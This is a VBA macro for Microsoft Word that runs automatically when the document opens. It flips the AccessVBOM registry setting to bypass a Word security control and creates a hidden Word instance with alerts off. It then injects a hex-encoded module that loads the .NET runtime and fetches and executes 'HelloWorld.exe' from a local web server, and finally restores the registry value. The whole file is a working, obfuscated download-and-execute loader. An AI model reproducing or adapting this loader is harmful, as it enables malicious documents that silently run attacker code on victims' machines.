Option Explicit

Function HexDecode(hex$)
    Dim b
    With CreateObject("Microsoft.XMLDOM").createElement("hex")
        .DataType = "bin.hex": .Text = hex
        b = .nodeTypedValue
        With CreateObject("ADODB.Stream")
            .Open: .Type = 1: .Write b: .Position = 0: .Type = 2: .Charset = "utf-8"
            HexDecode = .ReadText
            .Close
        End With
    End With
End Function

Private Sub SetRegKey(val As Integer)
 Dim wsh As Object
 Dim registryKey As String
 Set wsh = CreateObject("WScript.Shell")
 registryKey = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Application.Version & "\Word\Security\AccessVBOM"
 wsh.RegWrite registryKey, val, "REG_DWORD"
End Sub
    

Sub AutoOpen()
    SetRegKey (1)
    
    Dim wordObj As Word.Application
    Set wordObj = CreateObject("Word.Application")
    
    Dim ModuleObj As Object
    Set ModuleObj = wordObj.Documents.Add().VBProject.VBComponents.Add(1)
    ModuleObj.Name = "TestModule"

    'ExecuteAssembly.vba hex encoded; certutil.exe -encodehex ExecuteAssembly.vba encoded.txt
    Dim stg1 As String
    stg1 = "4f7074696f6e204578706c696369740d0a0d0a50726976617465204465636c61726520507472536166"
    stg1 = stg1 & "652046756e6374696f6e204469737043616c6c46756e63204c696220226f6c6561757433322e646c"
    stg1 = stg1 & "6c222028427956616c207076204173204c6f6e675074722c20427956616c206f76204173204c6f6e"
    stg1 = stg1 & "675074722c20427956616c20636320417320496e74656765722c20427956616c2076722041732049"
    stg1 = stg1 & "6e74656765722c20427956616c206361204173204c6f6e672c20427952656620707220417320496e"
    stg1 = stg1 & "74656765722c204279526566207067204173204c6f6e675074722c20427952656620706172204173"
    stg1 = stg1 & "2056617269616e7429204173204c6f6e670d0a0d0a537562205374673128290d0a0d0a2020202054"
    stg1 = stg1 & "686973446f63756d656e742e564250726f6a6563742e5265666572656e6365732e41646446726f6d"
    stg1 = stg1 & "46696c652022433a5c57696e646f77735c4d6963726f736f66742e4e45545c4672616d65776f726b"
    stg1 = stg1 & "5c76322e302e35303732375c6d73636f7265652e746c62220d0a2020202054686973446f63756d65"
    stg1 = stg1 & "6e742e564250726f6a6563742e5265666572656e6365732e41646446726f6d46696c652022433a5c"
    stg1 = stg1 & "57696e646f77735c4d6963726f736f66742e4e45545c4672616d65776f726b5c76322e302e353037"
    stg1 = stg1 & "32375c6d73636f726c69622e746c62220d0a202020200d0a2020202043616c6c20537467320d0a0d"
    stg1 = stg1 & "0a456e64205375620d0a0d0a537562205374673228290d0a0d0a2020202044696d2075726c0d0a20"
    stg1 = stg1 & "20202075726c203d2022687474703a2f2f3132372e302e302e313a383138302f48656c6c6f576f72"
    stg1 = stg1 & "6c642e657865220d0a202020200d0a0d0a2020202044696d20494352486f7374204173204e657720"
    stg1 = stg1 & "6d73636f7265652e436f7252756e74696d65486f73740d0a2020202044696d2049446f6d61696e20"
    stg1 = stg1 & "417320417070446f6d61696e0d0a20202020494352486f73742e53746172740d0a20202020494352"
    stg1 = stg1 & "486f73742e47657444656661756c74446f6d61696e2049446f6d61696e0d0a200d0a202020204469"
    stg1 = stg1 & "6d207072677674283020546f20312920417320496e74656765720d0a2020202044696d2070726770"
    stg1 = stg1 & "76617267283020546f203129204173204c6f6e675074720d0a202020200d0a202020207072677674"
    stg1 = stg1 & "283029203d205661725479706528435661722875726c29290d0a2020202070726770766172672830"
    stg1 = stg1 & "29203d205661725074722875726c290d0a0d0a2020202044696d206f75743a206f7574203d20300d"
    stg1 = stg1 & "0a2020202044696d207265742041732056617269616e740d0a202020200d0a202020207072677674"
    stg1 = stg1 & "283129203d20566172547970652843566172286f757429290d0a2020202070726770766172672831"
    stg1 = stg1 & "29203d20566172507472286f7574290d0a202020200d0a202020200d0a2020202044696d20687220"
    stg1 = stg1 & "4173204c6f6e670d0a202020206872203d204469737043616c6c46756e63284f626a507472284944"
    stg1 = stg1 & "6f6d61696e292c203531202a204c656e287072677076617267283029292c20342c2076624c6f6e67"
    stg1 = stg1 & "2c20322c2070726776742830292c2070726770766172672830292c20726574290d0a202020200d0a"
    stg1 = stg1 & "456e64205375620d0a0d0a0d0a"
    
    Dim stg1dec As String
    stg1dec = HexDecode(stg1)
    
    wordObj.Visible = False
    wordObj.DisplayAlerts = False
    ModuleObj.codeModule.AddFromString (stg1dec)
    wordObj.Application.Run ("TestModule.Stg1")
    wordObj.ActiveDocument.Close (False)
    'wordObj.Documents(1).Close (False)
    
    SetRegKey (0)
        
    
End Sub